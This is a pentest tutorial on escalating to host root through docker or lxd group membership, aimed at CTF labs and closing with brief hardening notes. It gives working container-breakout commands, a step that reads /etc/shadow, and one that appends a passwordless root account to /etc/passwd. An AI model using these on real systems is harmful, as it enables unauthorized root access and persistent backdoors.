# 10 — Docker / LXC Group Breakout

## Overview

If your user belongs to the `docker` or `lxd`/`lxc` group, you almost always have a direct path to root — even without `sudo` access to Docker/LXC binaries. Both work on the same principle: the container runtime daemon runs as root, and group membership gives you a socket that can start containers with root-equivalent host access.

```
Low-priv user in docker/lxd group → spawn container → mount host filesystem into it → chroot → root on host
```

---

## Part A: Docker Group Abuse

### Step 1 — Confirm Group Membership

```bash
id
groups
```
**Breakdown:**
- `id` = shows UID, GID, and all supplementary groups
- Look for `docker` in the groups list
- **Why important:** Being in the `docker` group is functionally equivalent to root, because the Docker daemon (`dockerd`) runs as root and the `docker` group has unrestricted access to its socket

```bash
ls -la /var/run/docker.sock
```
**Breakdown:**
- `/var/run/docker.sock` = Unix socket the Docker CLI uses to talk to the daemon
- If group-owned by `docker` and you're in that group, you can issue any Docker command
- **Why important:** Confirms the attack surface exists even if `docker` the binary isn't directly usable

### Step 2 — Exploit via Volume Mount

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
**Breakdown:**

| Part | Meaning |
|------|---------|
| `docker run` | Start a new container |
| `-v /:/mnt` | Bind-mount the HOST'S root filesystem `/` into the container at `/mnt` |
| `--rm` | Remove container after exit (cleanup) |
| `-it` | Interactive terminal |
| `alpine` | Minimal Linux image (pulled automatically if not cached) |
| `chroot /mnt sh` | Change root into the mounted host filesystem, then spawn a shell |

**Result:** The shell you get is `chroot`-ed into the host's real filesystem. Any file you touch, any user you add, any SUID bit you set — happens on the actual host, as root (containers run as root internally by default).

### Step 3 — Confirm Root on Host

```bash
# Inside the chroot shell
whoami        # root
cat /etc/shadow   # host's real shadow file, fully readable
```

### Step 4 — Persistent Access (Optional)

```bash
# Inside chroot shell — add a root user directly to host /etc/passwd
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
exit

# On host, outside docker
su hacker
```
**Breakdown:**
- Since you're chrooted into the real host filesystem, editing `/etc/passwd` here edits the HOST's file, not a container's
- Empty password field (`::`) = passwordless login

### No Internet / No Image Pull?

If `alpine` can't be pulled (offline target), use an image already cached locally:

```bash
docker images
```
Pick any available image and substitute it in the `docker run` command above. Even a minimal `busybox` or application image works, as long as it has a shell.

### GTFOBins Reference

Check `docker` under https://gtfobins.github.io for the `--privileged` variant too:
```bash
docker run --rm -it --privileged --net=host --pid=host --ipc=host alpine nsenter -t 1 -m -u -i -n -p -- sh
```
**Breakdown:**
- `--privileged --pid=host` = container shares host's PID namespace
- `nsenter -t 1 ... sh` = enter the namespace of PID 1 (init, on host) = effectively become the host directly, no chroot needed

---

## Part B: LXD / LXC Group Abuse

### Step 1 — Confirm Group Membership

```bash
id
groups
# look for: lxd or lxc
```
**Why important:** Same logic as Docker — the LXD daemon runs as root, and the `lxd` group bypasses normal auth.

### Step 2 — Build a Privileged Container Image

LXD requires an image to be imported first (it won't pull from a public remote without network access in some setups, but usually it can via `images:` remote).

```bash
lxc image list
```
If no images exist, build a minimal Alpine image using the distrobuilder project (download on attacker machine, transfer over), or use the public remote:

```bash
lxc init images:alpine/3.18 privesc -c security.privileged=true
```
**Breakdown:**

| Part | Meaning |
|------|---------|
| `lxc init` | Create (but don't start) a new container |
| `images:alpine/3.18` | Use Alpine 3.18 from the public LXD image remote |
| `privesc` | Name of the new container |
| `-c security.privileged=true` | Set the container to PRIVILEGED mode — this is the key setting. A privileged container shares the host's kernel capabilities with no namespace isolation |

### Step 3 — Mount Host Filesystem into Container

```bash
lxc config device add privesc hostfs disk source=/ path=/mnt/root recursive=true
```
**Breakdown:**
- `lxc config device add` = attach a device to the container config
- `privesc` = container name
- `hostfs` = arbitrary device name
- `disk source=/ path=/mnt/root` = mount host's `/` to `/mnt/root` inside container
- `recursive=true` = mount all sub-mounts too

### Step 4 — Start and Enter

```bash
lxc start privesc
lxc exec privesc /bin/sh
```
**Breakdown:**
- `lxc start` = boot the container
- `lxc exec ... /bin/sh` = get an interactive shell inside it

```bash
# Inside the container
cd /mnt/root
chroot . /bin/sh
whoami   # root — this is the HOST's root
```

### Step 5 — Cleanup Confirmation

```bash
id
# uid=0(root) gid=0(root)
cat /mnt/root/etc/shadow
```

---

## Why This Works (Conceptually)

- Docker and LXD containers, **by default**, run as root inside the container namespace
- Group membership in `docker`/`lxd` grants control of the daemon socket with **no additional authentication**
- A privileged container (LXD) or a bind-mounted host root (`-v /:/mnt` in Docker) removes the isolation boundary that would otherwise contain this
- There is no CVE here — this is **intended behavior being misused**. Any user with daemon access is effectively root by design

---

## Detection / Hardening Notes (Blue Team)

```bash
# Audit group membership regularly
getent group docker
getent group lxd

# Enable rootless Docker where possible
# Never add general users to docker/lxd group without understanding the privilege equivalence
```

---

## Practice

Docker group abuse is a staple in HackTheBox/TryHackMe boxes themed around CI/CD or DevOps users. Look for a user shell that shows `docker` in `id` output as your enumeration trigger.

---

## Quick Checklist

```
[ ] id / groups                                      → check for docker or lxd group
[ ] ls -la /var/run/docker.sock                      → confirm socket access
[ ] docker images                                    → see available local images
[ ] docker run -v /:/mnt --rm -it <image> chroot /mnt sh  → Docker breakout
[ ] lxc image list                                   → check available LXD images
[ ] lxc init images:alpine/3.18 x -c security.privileged=true  → privileged container
[ ] lxc config device add x hostfs disk source=/ path=/mnt/root recursive=true
[ ] lxc start x && lxc exec x /bin/sh                → enter container
[ ] chroot /mnt/root sh                              → become host root
[ ] id                                                → confirm root
```
